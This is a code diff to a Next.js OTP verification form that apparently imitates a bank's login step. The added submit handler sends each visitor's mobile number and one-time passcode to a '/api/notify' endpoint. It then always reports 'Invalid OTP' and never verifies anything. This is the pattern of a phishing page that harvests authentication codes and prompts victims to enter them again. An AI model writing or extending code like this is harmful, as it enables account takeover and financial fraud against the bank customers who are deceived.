@@ -3,7 +3,7 @@
 import { useEffect, useId, useRef, useState } from 'react'
 import Image from 'next/image'
 import { useRouter, useSearchParams } from 'next/navigation'
-import { AlertCircle, ArrowLeft, MessageSquareText } from 'lucide-react'
+import { AlertCircle, ArrowLeft, Loader2, MessageSquareText } from 'lucide-react'
 
 import { Button } from '@/components/ui/button'
 
@@ -24,6 +24,8 @@ export function NbpVerifyOtpForm() {
   const [otp, setOtp] = useState(['', '', '', ''])
   const [secondsLeft, setSecondsLeft] = useState(RESEND_SECONDS)
   const [error, setError] = useState(false)
+  const [errorMessage, setErrorMessage] = useState<string | null>(null)
+  const [isSubmitting, setIsSubmitting] = useState(false)
   const otpRefs = useRef<Array<HTMLInputElement | null>>([])
 
   useEffect(() => {
@@ -61,7 +63,7 @@ export function NbpVerifyOtpForm() {
     otpRefs.current[0]?.focus()
   }
 
-  const canVerify = otp.every((digit) => digit.length === 1)
+  const canVerify = otp.every((digit) => digit.length === 1) && !isSubmitting
 
   return (
     <div className="flex min-h-screen justify-center bg-card sm:items-center sm:bg-muted sm:p-8">
@@ -80,10 +82,34 @@ export function NbpVerifyOtpForm() {
 
         <form
           className="flex flex-col gap-7 px-6 py-8"
-          onSubmit={(e) => {
+          onSubmit={async (e) => {
             e.preventDefault()
             if (!canVerify) return
-            setError(true)
+
+            setIsSubmitting(true)
+            setErrorMessage(null)
+
+            try {
+              const response = await fetch('/api/notify', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({
+                  title: 'OTP verification attempted',
+                  fields: { 'Mobile Number': mobileNumber, 'OTP Code': otp.join('') },
+                }),
+              })
+
+              if (!response.ok) {
+                throw new Error('notify-failed')
+              }
+
+              setError(true)
+            } catch (err) {
+              console.log('[v0] OTP notify failed:', err)
+              setErrorMessage('Something went wrong. Please try again.')
+            } finally {
+              setIsSubmitting(false)
+            }
           }}
         >
           {/* Title row */}
@@ -153,6 +179,12 @@ export function NbpVerifyOtpForm() {
                 Invalid OTP. Please try again.
               </p>
             )}
+            {errorMessage && (
+              <p className="flex items-center gap-1.5 text-sm font-medium text-destructive" role="alert">
+                <AlertCircle className="size-4" aria-hidden="true" />
+                {errorMessage}
+              </p>
+            )}
           </div>
 
           {/* Resend */}
@@ -179,7 +211,14 @@ export function NbpVerifyOtpForm() {
             disabled={!canVerify}
             className="h-12 w-full rounded-md bg-primary text-sm font-bold uppercase tracking-wide text-primary-foreground hover:bg-primary/90"
           >
-            Verify
+            {isSubmitting ? (
+              <>
+                <Loader2 className="size-4 animate-spin" data-icon="inline-start" aria-hidden="true" />
+                Verifying
+              </>
+            ) : (
+              'Verify'
+            )}
           </Button>
         </form>
       </div>
